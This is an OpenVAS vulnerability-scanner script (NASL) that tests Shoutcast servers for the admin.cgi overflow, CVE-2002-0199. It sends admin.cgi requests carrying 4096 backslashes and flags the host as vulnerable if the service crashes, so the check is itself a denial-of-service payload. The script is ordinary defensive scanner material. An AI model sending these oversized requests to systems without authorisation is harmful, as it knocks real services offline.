###############################################################################
# OpenVAS Vulnerability Test
#
# admin.cgi overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11719");
  script_version("2022-05-12T09:32:01+0000");
  script_tag(name:"last_modification", value:"2022-05-12 09:32:01 +0000 (Thu, 12 May 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3934");
  script_cve_id("CVE-2002-0199");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("admin.cgi overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "embedded_web_server_detect.nasl");
  script_require_ports("Services/www", 8888); # Shoutcast is often on a high port
  script_mandatory_keys("shoutcast/banner");

  script_tag(name:"solution", value:"Upgrade Shoutcast to the latest version.");

  script_tag(name:"summary", value:"The Shoutcast server crashes when a too long argument is
  given to admin.cgi");

  script_tag(name:"impact", value:"An attacker may use this flaw to prevent your server from
  working, or worse, execute arbitrary code on your system.");

  script_tag(name:"affected", value:"Shoutcast server 1.8.3 is known to be affected.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:8888 );
if( http_get_is_marked_embedded( port:port ) )
  exit( 0 );

if( http_is_dead( port:port, retry:0 ) )
  exit( 0 );

banner = http_get_remote_headers( port:port );

if( ! egrep( pattern:"shoutcast", string:banner, icase:TRUE ) ) exit( 0 );

url = string( "/admin.cgi?pass=", crap( length:4096, data:"\" ) );
req = http_get( item:url, port:port );
res = http_send_recv( port:port, data:req );

url = string( "/admin.cgi?", crap( length:4096, data:"\" ) );
req = http_get( item:url, port:port );
res = http_send_recv( port:port, data:req );

if( http_is_dead( port:port ) ) {
  report = http_report_vuln_url( port:port, url:"/admin.cgi" );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
